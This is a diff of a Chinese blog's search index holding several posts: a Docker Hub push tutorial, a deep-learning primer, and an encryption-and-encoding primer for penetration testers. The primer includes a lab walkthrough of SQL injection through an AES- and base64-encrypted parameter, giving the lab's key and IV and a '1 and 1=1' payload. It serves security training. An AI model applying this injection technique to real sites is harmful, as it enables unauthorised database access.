+<li><p>进入题目<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009328449-b3b9a111-b158-45b8-8d76-fdddb6d182f7.png" alt="img"></p>
+</li>
+<li><p>使用御剑扫描该IP<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009328616-d19a31c2-cc9a-4d16-a43f-1bf13a1b8d84.png" alt="img"></p>
+</li>
+<li><p>在浏览器中输入该URL，发现使用PHP文件<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009328717-1f1af3db-8b69-48c7-a405-5ede814c53a0.png" alt="img"></p>
+</li>
+<li><p>访问该URL，下载压缩包并解压<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009328788-35a73086-1963-40d3-a667-144f845e56c5.png" alt="img"></p>
+</li>
+<li><p>得到解密源码<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009328861-174cadf0-c93b-4f78-9c36-1f69848732ac.png" alt="img"></p>
+</li>
+<li><p>审计源码，发现是由两次base64加密得到。<br>一次base64解密，<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009329047-f2d55761-c063-4f56-a75a-edb377c08d61.png" alt="img"></p>
+</li>
+<li><p>二次base64解密：</p>
+</li>
+</ol>
+<p>&emsp;&emsp;选中对应模式：<br>&emsp;&emsp;AES加密模式：CBC、数据块：128位、密码：ydhaqPQnexoaDuW3、偏移量：2018201920202021<br>&emsp;&emsp;解密得出：1_mozhe<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009329131-edee9451-df51-48b1-8209-00872a6f056e.png" alt="img"></p>
+<ol start="8">
+<li><p>审计代码，最终得出值为：1<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009329226-e70f8990-d301-4f16-bc3a-e141e879fc04.png" alt="img"></p>
+</li>
+<li><p>在SQL注入时，要将1 and 1=1或者其他payload共同按格式加密之后才可以进行<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009329352-81751509-51df-40d9-9bec-873da368fdc2.png" alt="img"></p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>发布自己的镜像</title>
+    <url>/post/23e16792.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>&emsp;&emsp;地址：<a href="https://hub.docker.com/">https://hub.docker.com/</a> 注册自己的账号</p>
+<p>&emsp;&emsp;在我们服务器上登录自己的DockerHub账号：<code>docker login -u 用户名 -p 密码</code></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630779657095-37375107-3b26-4f1a-896d-c86cf7a64a32.png" alt="img"></p>
+<p>&emsp;&emsp;登录完毕就可以提交自己镜像了：<code>docker push 用户名/镜像名:TAG</code></p>
+<ul>
+<li>这里我先用<code>docker tag 镜像ID ...</code>命令对镜像进行了重命名和TAG设置</li>
+</ul>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630781971355-168d52cc-ae9f-46ce-b214-e3dd7e9abe27.png" alt="img"></p>
+<p>&emsp;&emsp;push成功</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630784283998-c840345f-a28f-4ec5-8c51-b54807ab6c53.png" alt="img"></p>
+<p>&emsp;&emsp;查看DockerHub的确上传成功了</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630784629448-9c399d90-6f16-4343-b0f3-e7191278d180.png" alt="img"></p>
+]]></content>
+      <categories>
+        <category>docker</category>
+      </categories>
+      <tags>
+        <tag>docker</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>使用Watchdog监控文件</title>
     <url>/post/8501a278.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>好久没有更新了，最近刚到家，调整了下状态继续学习更新</p>
@@ -2786,95 +2874,6 @@
       </categories>
       <tags>
         <tag>Python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>加密编码算法</title>
-    <url>/post/57602181.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>&emsp;&emsp;在渗透测试中，常见的密码等敏感信息会采用加密处理，其中作为安全测试人员必须要了解常见的加密方式，才能为后续的安全测试做好准备，本次课程将讲解各种加密编码等知识，便于后期的学习和发展</p>
-<h1 id="二、常见加密编码等算法解析"><a href="#二、常见加密编码等算法解析" class="headerlink" title="二、常见加密编码等算法解析"></a>二、常见加密编码等算法解析</h1><p>&emsp;&emsp;MD5，SHA，ASC，进制，时间戳，URL，BASE64，Unescape，AES，DES等</p>
-<h2 id="1、MD5（不可逆）"><a href="#1、MD5（不可逆）" class="headerlink" title="1、MD5（不可逆）"></a>1、MD5（不可逆）</h2><p>&emsp;&emsp;16位和32位，加密密文字符串由A-F,0-9随机分配，80%网站管理员或用户密码加采取MD5加密。(不可逆)</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631426676161-c5207f4e-1428-47ce-9010-f80620b3d40b.png" alt="img"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631426783155-a2d53afe-f8c2-4f8e-b5f8-fedc743a8f62.png" alt="img"></p>
-<p>&emsp;&emsp;网上的MD5在线工具，它的解密过程是用了枚举方法</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009295062-a4e72231-36a0-4be4-ac79-0340fa3d17e8.png" alt="img"></p>
-<h2 id="2、SHA"><a href="#2、SHA" class="headerlink" title="2、SHA"></a>2、SHA</h2><p>&emsp;&emsp;由A-Z，0-9随机组合，SHA1，SHA256，SHA384，SHA512长度固定。(不可逆）</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009295136-57840de0-5012-4b7c-ac74-2d1c97e41211.png" alt="img"></p>
-<h2 id="3、进制"><a href="#3、进制" class="headerlink" title="3、进制"></a>3、进制</h2><p>&emsp;&emsp;16进制加密</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631427004811-2c9cc3e6-d6b8-4db1-8390-0cb09922eed0.png" alt="img"></p>
-<h2 id="4、Unix时间戳"><a href="#4、Unix时间戳" class="headerlink" title="4、Unix时间戳"></a>4、Unix时间戳</h2><p>&emsp;&emsp;网站或者服务器脚本语言里经常会使用，会在数据库里用户登录和注销，注册里会使用</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631427097207-92187c11-18a6-4402-8ccf-b6affe403e15.png" alt="img"></p>
-<h2 id="5、URL"><a href="#5、URL" class="headerlink" title="5、URL"></a>5、URL</h2><p>&emsp;&emsp;浏览器只做一次加密，在渗透绕过的时候可能会使用二次，三次加密方式</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009295291-0cc7eda4-7dac-4031-b66a-d5aef5655877.png" alt="img"></p>
-<h2 id="6、Base64"><a href="#6、Base64" class="headerlink" title="6、Base64"></a>6、Base64</h2><p>&emsp;&emsp;大小写随机组合，在字符串后面经常出现一个或两个等号</p>
-<p>&emsp;&emsp;明文越长，密文越长</p>
-<p>&emsp;&emsp;常见应用：代码、密码、参数</p>
-<p>&emsp;&emsp;浏览器只做一次加密，在渗透绕过的时候可能会使用二次，三次加密方式</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009295381-29bdb9b3-1184-4348-819c-b6394c52daaa.png" alt="img"></p>
-<h2 id="7、Unescape"><a href="#7、Unescape" class="headerlink" title="7、Unescape"></a>7、Unescape</h2><p>&emsp;&emsp;%u+4位数字，对应两位字符，主要应用WEB应用上</p>
-<p>&emsp;&emsp;当明文字符数量为单数时</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009295457-6bfb19de-f1ec-4a1a-be5a-2115b676a88e.png" alt="img"></p>
-<p>&emsp;&emsp;为双数时，最后一个为%u0000</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631427823242-5d2fc701-ccfb-491a-8bc3-ec2c4d63a3a4.png" alt="img"></p>
-<p>&emsp;&emsp;通过单数和双数的比较也能侧面反映出，%u+4位数字对应两位字符</p>
-<h2 id="8、AES"><a href="#8、AES" class="headerlink" title="8、AES"></a>8、AES</h2><p>&emsp;&emsp;是一种安全的加密方式，涉及到密码，偏移量，数据块，填充，在加密时候涉及到4种随机性。解密难度大。用base64解密出来是乱码，有很大可能是AES加密。有时候/出现在字符串里面。比较注重安全和大型网站、安全比赛<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009295532-b1755fc0-94ce-45c4-84a3-97f05db9b007.png" alt="img"></p>
-<h2 id="9、DES"><a href="#9、DES" class="headerlink" title="9、DES"></a>9、DES</h2><p>&emsp;&emsp;类似于BASE64，有时候+会出现字符串里</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009295607-6d69664a-ae6f-4bb8-91d2-d0a94097297a.png" alt="img"></p>
-<h1 id="三、常见加密形式算法解析"><a href="#三、常见加密形式算法解析" class="headerlink" title="三、常见加密形式算法解析"></a>三、常见加密形式算法解析</h1><p>&emsp;&emsp;直接加密，带salt，带密码，带偏移，带位数，带模式，带干扰，自定义组合等</p>
-<h1 id="四、常见解密方式（针对）"><a href="#四、常见解密方式（针对）" class="headerlink" title="四、常见解密方式（针对）"></a>四、常见解密方式（针对）</h1><p>&emsp;&emsp;枚举，自定义逆向算法，可逆向</p>
-<h1 id="五、了解常规加密算法的特性"><a href="#五、了解常规加密算法的特性" class="headerlink" title="五、了解常规加密算法的特性"></a>五、了解常规加密算法的特性</h1><p>&emsp;&emsp;长度位数，字符规律，代码分析，搜索获取等</p>
-<h1 id="六、演示案例"><a href="#六、演示案例" class="headerlink" title="六、演示案例"></a>六、演示案例</h1><h2 id="1、SQL注入漏洞测试（参数加密）"><a href="#1、SQL注入漏洞测试（参数加密）" class="headerlink" title="1、SQL注入漏洞测试（参数加密）"></a>1、SQL注入漏洞测试（参数加密）</h2><ol>
-<li><p>进入题目<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009328449-b3b9a111-b158-45b8-8d76-fdddb6d182f7.png" alt="img"></p>
-</li>
-<li><p>使用御剑扫描该IP<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009328616-d19a31c2-cc9a-4d16-a43f-1bf13a1b8d84.png" alt="img"></p>
-</li>
-<li><p>在浏览器中输入该URL，发现使用PHP文件<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009328717-1f1af3db-8b69-48c7-a405-5ede814c53a0.png" alt="img"></p>
-</li>
-<li><p>访问该URL，下载压缩包并解压<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009328788-35a73086-1963-40d3-a667-144f845e56c5.png" alt="img"></p>
-</li>
-<li><p>得到解密源码<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009328861-174cadf0-c93b-4f78-9c36-1f69848732ac.png" alt="img"></p>
-</li>
-<li><p>审计源码，发现是由两次base64加密得到。<br>一次base64解密，<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009329047-f2d55761-c063-4f56-a75a-edb377c08d61.png" alt="img"></p>
-</li>
-<li><p>二次base64解密：</p>
-</li>
-</ol>
-<p>&emsp;&emsp;选中对应模式：<br>&emsp;&emsp;AES加密模式：CBC、数据块：128位、密码：ydhaqPQnexoaDuW3、偏移量：2018201920202021<br>&emsp;&emsp;解密得出：1_mozhe<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009329131-edee9451-df51-48b1-8209-00872a6f056e.png" alt="img"></p>
-<ol start="8">
-<li><p>审计代码，最终得出值为：1<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009329226-e70f8990-d301-4f16-bc3a-e141e879fc04.png" alt="img"></p>
-</li>
-<li><p>在SQL注入时，要将1 and 1=1或者其他payload共同按格式加密之后才可以进行<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009329352-81751509-51df-40d9-9bec-873da368fdc2.png" alt="img"></p>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>Web安全</category>
-      </categories>
-      <tags>
-        <tag>Web安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>发布自己的镜像</title>
-    <url>/post/23e16792.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>&emsp;&emsp;地址：<a href="https://hub.docker.com/">https://hub.docker.com/</a> 注册自己的账号</p>
-<p>&emsp;&emsp;在我们服务器上登录自己的DockerHub账号：<code>docker login -u 用户名 -p 密码</code></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630779657095-37375107-3b26-4f1a-896d-c86cf7a64a32.png" alt="img"></p>
-<p>&emsp;&emsp;登录完毕就可以提交自己镜像了：<code>docker push 用户名/镜像名:TAG</code></p>
-<ul>
-<li>这里我先用<code>docker tag 镜像ID ...</code>命令对镜像进行了重命名和TAG设置</li>
-</ul>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630781971355-168d52cc-ae9f-46ce-b214-e3dd7e9abe27.png" alt="img"></p>
-<p>&emsp;&emsp;push成功</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630784283998-c840345f-a28f-4ec5-8c51-b54807ab6c53.png" alt="img"></p>
-<p>&emsp;&emsp;查看DockerHub的确上传成功了</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630784629448-9c399d90-6f16-4343-b0f3-e7191278d180.png" alt="img"></p>
-]]></content>
-      <categories>
-        <category>docker</category>
-      </categories>
-      <tags>
-        <tag>docker</tag>
       </tags>
   </entry>
   <entry>
@@ -3116,76 +3115,6 @@
       </tags>
   </entry>
   <entry>
-    <title>深度学习基础——什么是深度学习</title>
-    <url>/post/76a6120c.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、人工智能、机器学习与深度学习"><a href="#一、人工智能、机器学习与深度学习" class="headerlink" title="一、人工智能、机器学习与深度学习"></a>一、人工智能、机器学习与深度学习</h1><p>&emsp;&emsp;首先，在提到人工智能时，我们需要明确定义所讨论的内容。什么是人工智能，机器学习与深度学习。这三者之间有什么关系</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642149409249-2dd2e81e-1a6d-4adf-a4da-8120216c9656.png" alt="img"></p>
-<h2 id="1、人工智能（AI）"><a href="#1、人工智能（AI）" class="headerlink" title="1、人工智能（AI）"></a>1、人工智能（AI）</h2><p>&emsp;&emsp;人工智能的简介定义如下：努力将通常由人类完成的智能任务自动化。</p>
-<h2 id="2、机器学习（Machine-Learning）"><a href="#2、机器学习（Machine-Learning）" class="headerlink" title="2、机器学习（Machine Learning）"></a>2、机器学习（Machine Learning）</h2><p>&emsp;&emsp;机器学习的概念就来自于图灵的这个问题：对于计算机而言，除了“我们命令它做的任何事情”之外，它能否自我学习执行特定任务的方法？计算机能否让我们大吃一惊？如果没有程序员精心编写的数据处理规则，计算机能否通过观察数据自动学会这些规则？</p>
-<p>&emsp;&emsp;图灵的这个问题引出了一种新的编程范式。在经典的程序设计（即符号主义人工智能的范式）中，人们输入的是规则（即程序）和需要根据这些规则进行处理的数据，系统输出的是答案。利用机器学习，人们输入的是数据和从这些数据中预期得到的答案，系统输出的是规则。这些规则随后可应用于新的数据，并使计算机自主生成答案。</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642150297514-da1c23f0-1ddc-464b-b81e-4369a171cc9b.png" alt="img"></p>
-<p>&emsp;&emsp;机器学习系统是<strong>训练出来的</strong>，而不是明确地用程序编写出来的。将与某个任务相关的许多示例输入机器学习系统，它会在这些示例中找到统计结构，从而最终找到规则将任务自动化。举个例子，你想为度假照片添加标签，并且希望将这项任务自动化，那么你可以将许多人工打好标签的照片输入机器学习系统，系统将学会将照片与特定标签联系在一起的统计规则。</p>
-<h3 id="（1）概率建模"><a href="#（1）概率建模" class="headerlink" title="（1）概率建模"></a>（1）概率建模</h3><p>&emsp;&emsp;<strong>概率建模</strong>（probabilistic modeling）是统计学原理在数据分析中的应用。它是最早的机器学习形式之一，至今仍在广泛使用。其中最有名的算法之一就是朴素贝叶斯算法。</p>
-<p>&emsp;&emsp;朴素贝叶斯是一类基于应用贝叶斯定理的机器学习分类器，它假设输入数据的特征都是独立的。这是一个很强的假设，或者说“朴素的”假设，其名称正来源于此。这种数据分析方法比计算机出现得还要早，在其第一次被计算机实现（很可能追溯到20世纪50年代）的几十年前就已经靠人工计算来应用了。贝叶斯定理和统计学基础可以追溯到18世纪，你学会了这两点就可以开始使用朴素贝叶斯分类器了。</p>
-<p>&emsp;&emsp;另一个密切相关的模型是logistic<strong>回归</strong>（logistic regression，简称logreg），它有时被认为是现代机器学习的“hello world”。不要被它的名称所误导——logreg是一种分类算法，而不是回归算法。与朴素贝叶斯类似，logreg的出现也比计算机早很长时间，但由于它既简单又通用，至今仍然很有用。面对一个数据集，数据科学家通常会首先尝试使用这个算法，以便初步熟悉手头的分类任务。</p>
-<h3 id="（2）核方法（Kernel-Method）"><a href="#（2）核方法（Kernel-Method）" class="headerlink" title="（2）核方法（Kernel Method）"></a>（2）核方法（Kernel Method）</h3><p>&emsp;&emsp;核方法是一组分类算法，其中最有名的就是支持向量机（SVM, support vector machine）。虽然Vladimir Vapnik和AlexeyChervonenkis早在1963年就发表了较早版本的线性公式[插图]，但SVM的现代公式由Vladimir Vapnik和Corinna Cortes于20世纪90年代初在贝尔实验室提出，并发表于1995年。</p>
-<p>&emsp;&emsp;SVM的目标是通过在属于两个不同类别的两组数据点之间找到良好<strong>决策边界</strong>（decision boundary，见图）来解决分类问题。决策边界可以看作一条直线或一个平面，将训练数据划分为两块空间，分别对应于两个类别。对于新数据点的分类，你只需判断它位于决策边界的哪一侧。</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642158284514-c5f2d553-6de0-4908-ba75-f0208b74c215.png" alt="img"></p>
-<p>SVM通过两步来寻找决策边界。</p>
-<ol>
-<li>将数据映射到一个新的高维表示，这时决策边界可以用一个超平面来表示（如果数据像上图那样是二维的，那么超平面就是一条直线）。</li>
-<li>尽量让超平面与每个类别最近的数据点之间的距离最大化，从而计算出良好决策边界（分割超平面），这一步叫作<strong>间隔最大化</strong>（maximizing the margin）。这样决策边界可以很好地推广到训练数据集之外的新样本。</li>
-</ol>
-<p>&emsp;&emsp;将数据映射到高维表示从而使分类问题简化，这一技巧可能听起来很不错，但在实践中通常是难以计算的。这时就需要用到核技巧（kernel trick，核方法正是因这一核心思想而得名）。其基本思想是：要想在新的表示空间中找到良好的决策超平面，你不需要在新空间中直接计算点的坐标，只需要在新空间中计算点对之间的距离，而利用核函数（kernel function）可以高效地完成这种计算。核函数是一个在计算上能够实现的操作，将原始空间中的任意两点映射为这两点在目标表示空间中的距离，完全避免了对新新示进行直接计算。核函数通常是人为选择的，而不是从数据中学到的——对于SVM来说，只有分割超平面是通过学习得到的。</p>
-<p>&emsp;&emsp;SVM刚刚出现时，在简单的分类问题上表现出了最好的性能。当时只有少数机器学习方法得到大量的理论支持，并且适合用于严肃的数学分析，因而非常易于理解和解释，SVM就是其中之一。由于SVM具有这些有用的性质，很长一段时间里它在实践中非常流行。</p>
-<p>&emsp;&emsp;但是，SVM很难扩展到大型数据集，并且在图像分类等感知问题上的效果也不好。SVM是一种比较浅层的方法，因此要想将其应用于感知问题，首先需要手动提取出有用的表示（这叫作<strong>特征工程</strong>），这一步骤很难，而且不稳定。</p>
-<h3 id="（3）决策树、随机森林与梯度提升机"><a href="#（3）决策树、随机森林与梯度提升机" class="headerlink" title="（3）决策树、随机森林与梯度提升机"></a>（3）决策树、随机森林与梯度提升机</h3><p><strong>&emsp;&emsp;决策树</strong>（decision tree）是类似于流程图的结构，可以对输入数据点进行分类或根据给定输入来预测输出值（见图）。决策树的可视化和解释都很简单。在21世纪前十年，从数据中学习得到的决策树开始引起研究人员的广泛关注。到了2010年，决策树经常比核方法更受欢迎</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642158524521-fc44905d-8e7c-4195-817b-bc5234bab4e2.png" alt="img"></p>
-<p>&emsp;&emsp;特别是<strong>随机森林</strong>（random forest）算法，它引入了一种健壮且实用的决策树学习方法，即首先构建许多决策树，然后将它们的输出集成在一起。随机森林适用于各种各样的问题——对于任何浅层的机器学习任务来说，它几乎总是第二好的算法。广受欢迎的机器学习竞赛网站Kaggle在2010年上线后，随机森林迅速成为平台上人们的最爱，直到2014年才被梯度提升机所取代。与随机森林类似，<strong>梯度提升机</strong>（gradientboosting machine）也是将弱预测模型（通常是决策树）集成的机器学习技术。它使用了<strong>梯度提升方法</strong>，通过迭代地训练新模型来专门解决之前模型的弱点，从而改进任何机器学习模型的效果。将梯度提升技术应用于决策树时，得到的模型与随机森林具有相似的性质，但在绝大多数情况下效果都比随机森林要好。它可能是目前处理非感知数据最好的算法之一（如果非要加个“之一”的话）。和深度学习一样，它也是Kaggle竞赛中最常用的技术之一。</p>
-<h2 id="3、从数据中学习表示"><a href="#3、从数据中学习表示" class="headerlink" title="3、从数据中学习表示"></a>3、从数据中学习表示</h2><p>&emsp;&emsp;为了给出<strong>深度学习</strong>的定义并搞清楚深度学习与其他机器学习方法的区别，我们首先需要知道机器学习算法在<strong>做</strong>什么。前面说过，给定包含预期结果的示例，机器学习将会发现执行一项数据处理任务的规则。因此，我们需要以下三个要素来进行机器学习。</p>
-<ol>
-<li><strong>输入数据点</strong>。例如，你的任务是语音识别，那么这些数据点可能是记录人们说话的声音文件。如果你的任务是为图像添加标签，那么这些数据点可能是图像。</li>
-<li><strong>预期输出的示例</strong>。对于语音识别任务来说，这些示例可能是人们根据声音文件整理生成的文本。对于图像标记任务来说，预期输出可能是“狗”“猫”之类的标签。</li>
-<li><strong>衡量算法效果好坏的方法</strong>。这一衡量方法是为了计算算法的当前输出与预期输出的差距。衡量结果是一种反馈信号，用于调节算法的工作方式。<strong>这个调节步骤就是我们所说的学习。</strong></li>
-</ol>
-<p>&emsp;&emsp;机器学习模型将输入数据变换为有意义的输出，这是一个从已知的输入和输出示例中进行“学习”的过程。因此，机器学习和深度学习的核心问题在于<strong>有意义地变换数据</strong>，换句话说，在于学习输入数据的有用<strong>表示</strong>（representation）——这种表示可以让数据更接近预期输出。在进一步讨论之前，我们需要先回答一个问题：什么是表示？这一概念的核心在于以一种不同的方式来查看数据（即<strong>表征</strong>数据或将数据<strong>编码</strong>）。例如，彩色图像可以编码为RGB（红-绿-蓝）格式或HSV（色相-饱和度-明度）格式，这是对相同数据的两种不同表示。在处理某些任务时，使用某种表示可能会很困难，但换用另一种表示就会变得很简单。举个例子，对于“选择图像中所有红色像素”这个任务，使用RGB格式会更简单，而对于“降低图像饱和度”这个任务，使用HSV格式则更简单。机器学习模型都是为输入数据寻找合适的表示——对数据进行变换，使其更适合手头的任务（比如分类任务）。</p>
-<p>&emsp;&emsp;我们来具体说明这一点。考虑x轴、y轴和在这个(x, y)坐标系中由坐标表示的一些点，如图所示。</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642150688473-4f5aadf3-7fec-44a5-b556-1aa44336efd3.png" alt="img"></p>
-<p>可以看到，图中有一些白点和一些黑点。假设我们想要开发一个算法，输入一个点的坐标(x, y)，就能够判断这个点是黑色还是白色。在这个例子中：</p>
-<ol>
-<li>输入是点的坐标；</li>
-<li>预期输出是点的颜色；</li>
-<li>衡量算法效果好坏的一种方法是，正确分类的点所占的百分比。</li>
-</ol>
-<p>这里我们需要的是一种新的数据表示，可以明确区分白点与黑点。可用的方法有很多，这里用的是坐标变换，如图所示。</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642150769639-c8f9978f-0105-4845-94b2-2b2711d115f1.png" alt="img"></p>
-<p>&emsp;&emsp;在这个新的坐标系中，点的坐标可以看作数据的一种新的表示。这种表示很棒！利用这种新的表示，用一条简单的规则就可以描述黑/白分类问题：“x&gt;0的是黑点”或“x&lt;0的是白点”。这种新的表示基本上解决了该分类问题。</p>
-<p>&emsp;&emsp;在这个例子中，我们人为定义了坐标变换。但是，如果我们尝试系统性地搜索各种可能的坐标变换，并用正确分类的点所占百分比作为反馈信号，那么我们做的就是机器学习。机器学习中的<strong>学习</strong>指的是，寻找更好数据表示的自动搜索过程。</p>
-<p>&emsp;&emsp;所有机器学习算法都包括自动寻找这样一种变换：这种变换可以根据任务将数据转化为更加有用的表示。这些操作可能是前面提到的坐标变换，也可能是线性投影（可能会破坏信息）、平移、非线性操作（比如“选择所有x&gt;0的点”），等等。机器学习算法在寻找这些变换时通常没有什么创造性，而仅仅是遍历一组预先定义好的操作，这组操作叫作<strong>假设空间</strong>（hypothesis space）。</p>
-<p>&emsp;&emsp;这就是机器学习的技术定义：在预先定义好的可能性空间中，利用反馈信号的指引来寻找输入数据的有用表示。这个简单的想法可以解决相当多的智能任务，从语音识别到自动驾驶都能解决。现在你理解了学习的含义，下面我们来看一下深度学习的特殊之处。</p>
-<h2 id="4、深度学习之“深度”"><a href="#4、深度学习之“深度”" class="headerlink" title="4、深度学习之“深度”"></a>4、深度学习之“深度”</h2><p>&emsp;&emsp;深度学习是机器学习的一个分支领域：它是从数据中学习表示的一种新方法，强调从连续的<strong>层</strong>（layer）中进行学习，这些层对应于越来越有意义的表示。“深度学习”中的“深度”指的并不是利用这种方法所获取的更深层次的理解，而是指一系列连续的表示层。数据模型中包含多少层，这被称为模型的<strong>深度</strong>（depth）。这一领域的其他名称包括<strong>分层表示学习</strong>（layered representationslearning）和<strong>层级表示学习</strong>（hierarchicalrepresentations learning）。现代深度学习通常包含数十个甚至上百个连续的表示层，这些表示层全都是从训练数据中自动学习的。与此相反，其他机器学习方法的重点往往是仅仅学习一两层的数据表示，因此有时也被称为<strong>浅层学习</strong>（shallowlearning）。</p>
-<p>&emsp;&emsp;在深度学习中，这些分层表示几乎总是通过叫作神经网络（neural network）的模型来学习得到的。神经网络的结构是逐层堆叠。神经网络这一术语来自于神经生物学，然而，虽然深度学习的一些核心概念是从人们对大脑的理解中汲取部分灵感而形成的，但深度学习模型不是大脑模型。没有证据表明大脑的学习机制与现代深度学习模型所使用的相同。你可能会读到一些流行科学的文章，宣称深度学习的工作原理与大脑相似或者是根据大脑的工作原理进行建模的，但事实并非如此。对于这一领域的新人来说，如果认为深度学习与神经生物学存在任何关系，那将使人困惑，只会起到反作用。你无须那种“就像我们的头脑一样”的神秘包装，最好也忘掉读过的深度学习与生物学之间的假想联系。就我们的目的而言，深度学习是从数据中学习表示的一种数学框架。</p>
-<p>&emsp;&emsp;深度学习算法学到的表示是什么样的？我们来看一个多层网络（见图）如何对数字图像进行变换，以便识别图像中所包含的数字。</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642151850866-015eebf8-5f18-4ae1-bf4f-e6cc5b549649.png" alt="img"></p>
-<p>&emsp;&emsp;如下图所示，这个网络将数字图像转换成与原始图像差别越来越大的表示，而其中关于最终结果的信息却越来越丰富。你可以将深度网络看作多级信息蒸馏操作：信息穿过连续的过滤器，其<strong>纯度</strong>越来越高（即对任务的帮助越来越大）。</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642151920619-49ed67b6-8b86-41aa-9fc4-f55effbdc9ef.png" alt="img"></p>
-<h2 id="5、用三张图理解深度学习的工作原理"><a href="#5、用三张图理解深度学习的工作原理" class="headerlink" title="5、用三张图理解深度学习的工作原理"></a>5、用三张图理解深度学习的工作原理</h2><p>&emsp;&emsp;现在你已经知道，机器学习是将输入（比如图像）映射到目标（比如标签“猫”），这一过程是通过观察许多输入和目标的示例来完成的。你还知道，深度神经网络通过一系列简单的数据变换（层）来实现这种输入到目标的映射，而这些数据变换都是通过观察示例学习到的。下面来具体看一下这种学习过程是如何发生的。</p>
-<p>&emsp;&emsp;神经网络中每层对输入数据所做的具体操作保存在该层的<strong>权重</strong>（weight）中，其本质是一串数字。用术语来说，每层实现的变换由其权重来<strong>参数化</strong>（parameterize，见下图）。权重有时也被称为该层的<strong>参数</strong>（parameter）。在这种语境下，<strong>学习</strong>的意思是为神经网络的所有层找到一组权重值，使得该网络能够将每个示例输入与其目标正确地一一对应。但重点来了：一个深度神经网络可能包含数千万个参数。找到所有参数的正确取值可能是一项非常艰巨的任务，特别是考虑到修改某个参数值将会影响其他所有参数的行为。</p>
